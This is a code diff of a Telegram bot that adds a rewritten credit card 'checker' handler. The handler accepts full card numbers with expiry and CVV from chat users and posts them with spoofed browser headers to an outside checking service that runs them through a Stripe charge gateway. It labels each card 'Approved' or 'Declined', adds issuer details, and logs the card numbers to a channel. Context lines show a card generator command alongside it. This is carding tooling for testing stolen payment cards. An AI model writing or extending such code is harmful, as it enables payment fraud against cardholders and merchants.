@@ -222,63 +222,6 @@ async def ai_handler(client: Client, message: Message):
     await log_to_channel(client, "AI", message, user_input, ai_response)
 
 # === CC Check Handler ===
-@app.on_message(filters.text & filters.regex(CC_REGEX))
-async def check_card(client: Client, message: Message):
-    match = re.search(CC_REGEX, message.text)
-    if not match:
-        await message.reply("Invalid format. Use: `/chk xxxxxxxxxxxxxxxx|MM|YYYY|CVV`")
-        return
-
-    card = match.group(1)
-    bin_code = card[:6]
-
-    # Send initial "processing" message
-    proc_msg = await message.reply_text(
-        f"↯ Checking..\n\n"
-        f"⌯ 𝐂𝐚𝐫𝐝 - <code>{card}</code>\n"
-        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>{GATEWAY_NAME}</code>\n"
-        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
-    )
-
-    start_time = time.time()
-
-    try:
-        response = requests.get(GATEWAY_URL_TEMPLATE.format(card), timeout=60)
-        elapsed = round(time.time() - start_time, 2)
-        result_json = response.json()
-        result_text = response.text.strip()
-
-        if "declined" in result_text.lower():
-            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
-        else:
-            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
-
-    except Exception as e:
-        await proc_msg.edit(f"❌ Error: {e}")
-        return
-
-    brand, bank, country = get_bin_info(bin_code)
-
-    final_msg = (
-        f"┏━━━━━━━⍟\n"
-        f"┃ {status}\n"
-        f"┗━━━━━━━━━━━⊛\n\n"
-        f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
-        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <code>{GATEWAY_NAME}</code>\n"
-        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{result_text}</code>\n\n"
-        f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
-        f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
-        f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
-        f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
-        f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
-        f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
-    )
-
-    await proc_msg.edit(final_msg, parse_mode=ParseMode.HTML)
-    
-    # Log to channel
-    await log_to_channel(client, "CC", message, card, status)
-
 # === CC Generator Handler ===
 @app.on_message(filters.command("gen", prefixes="/"))
 async def generate_cc_handler(client: Client, message: Message):
@@ -1411,6 +1354,93 @@ async def stripe_extended_handler(client: Client, message: Message):
         await message.reply(f"❌ Error processing command: {str(e)}")  
         if 'proc_msg' in locals():  
             await proc_msg.delete()
+
+# === CC Check Handler ===
+@app.on_message(filters.text & filters.regex(CC_REGEX))
+async def check_card(client: Client, message: Message):
+    match = re.search(CC_REGEX, message.text)
+    if not match:
+        await message.reply("Invalid format. Use: `/chk xxxxxxxxxxxxxxxx|MM|YYYY|CVV`")
+        return
+
+    card = match.group(1)
+    bin_code = card[:6]
+
+    # Send initial "processing" message
+    proc_msg = await message.reply_text(
+        f"↯ Checking..\n\n"
+        f"⌯ 𝐂𝐚𝐫𝐝 - <code>{card}</code>\n"
+        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>Stripe Charge</code>\n"
+        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
+    )
+
+    start_time = time.time()
+
+    try:
+        headers = {
+            'authority': 'takeshi-j8i9.onrender.com',
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/json',
+            'origin': 'https://takeshi-j8i9.onrender.com',
+            'referer': 'https://takeshi-j8i9.onrender.com/',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+        }
+
+        json_data = {
+            'card': card,
+            'site_id': None,
+            'gateway': 'stripe_charge',
+        }
+
+        response = requests.post(
+            'https://takeshi-j8i9.onrender.com/check_card',
+            headers=headers,
+            json=json_data,
+            timeout=30
+        )
+        
+        elapsed = round(time.time() - start_time, 2)
+        response_json = response.json()
+        
+        if "status" in response_json and response_json["status"].lower() == "declined":
+            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
+            response_text = response_json.get("message", "Card declined")
+        else:
+            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
+            response_text = response_json.get("message", "Card approved")
+
+    except Exception as e:
+        await proc_msg.edit(f"❌ Error: {str(e)}")
+        return
+
+    brand, bank, country = get_bin_info(bin_code)
+
+    final_msg = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
+        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe Charge\n"
+        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{response_text}</code>\n\n"
+        f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
+        f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
+        f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
+        f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username}\n"
+        f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
+        f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed} 𝐬𝐞𝐜𝐨𝗻𝗱𝘀"
+    )
+
+    await proc_msg.edit(final_msg, parse_mode=ParseMode.HTML)
+    
+    # Log to channel
+    await log_to_channel(client, "CC", message, card, status)
 
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
